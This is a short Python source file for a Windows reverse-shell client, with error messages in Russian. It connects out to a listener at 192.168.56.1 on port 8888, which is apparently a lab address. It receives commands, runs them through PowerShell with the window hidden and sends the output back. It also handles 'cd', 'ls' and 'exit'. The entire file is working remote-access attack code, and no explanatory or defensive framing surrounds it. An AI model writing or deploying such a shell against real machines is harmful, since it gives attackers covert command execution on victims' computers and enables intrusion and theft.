import socket
from subprocess import run, CREATE_NO_WINDOW
from os import chdir, getcwd, listdir

HOST = '192.168.56.1'
PORT = 8888

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:
    soc.connect((HOST, PORT))
    
    while True:
        output = ''
        server_command = soc.recv(4096).decode('utf-8')

        if not server_command:
            break

        if server_command == 'exit':
            break

        if server_command.lower().startswith('cd '):
            command_path = server_command[3:]
            try:
                chdir(command_path)
                output = getcwd()
            except Exception as err:
                output = f"[!] Ошибка перехода директории: {err}"
        elif server_command.lower() == 'ls':
            try:
                files = listdir('.')
                output = '\n' + '\n'.join(files) + '\n'
            except Exception as err:
                output = f"[!] Ошибка: {err}"
        else:
            try:
                result = run(['powershell', '-Command', f'chcp 65001 > $null; {server_command}'], capture_output=True, text=True, encoding='utf-8', creationflags=CREATE_NO_WINDOW)

                if result.stderr:
                    output += result.stderr

                if result.stdout:
                    output += result.stdout

                if result.returncode != 0:
                    output = f"[x] Выполнение команды завершилось с ошибкой, код: {result.returncode}"

                if not output:
                    output = f'[+] Команда "{server_command}" выполнена успешно'
            except Exception as err:
                output = str(err)

        soc.sendall(output.encode('utf-8'))



    